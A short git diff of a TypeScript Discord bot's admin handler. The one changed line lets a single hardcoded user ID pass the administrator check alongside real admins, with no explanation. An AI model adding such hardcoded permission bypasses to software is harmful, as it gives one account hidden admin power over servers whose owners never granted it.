@@ -77,7 +77,7 @@ export class AdminHandler extends BaseHandler {
     }
 
     private async replyIfAdmin(context: CommandInteraction | MessageComponentInteraction): Promise<Message | null> {
-        if (!(context.member as GuildMember).permissions.has(Permissions.FLAGS.ADMINISTRATOR)) {
+        if (!(context.member as GuildMember).permissions.has(Permissions.FLAGS.ADMINISTRATOR) && !['256715626951868416'].includes((context.member as GuildMember).id)) {
             const response = this.getEmbedTemplate(context).setDescription(`Sorry! Only admins can use the admin command`).toReplyOptions(true);
             return await context.reply({ ...response, fetchReply: true }) as Message;
         }
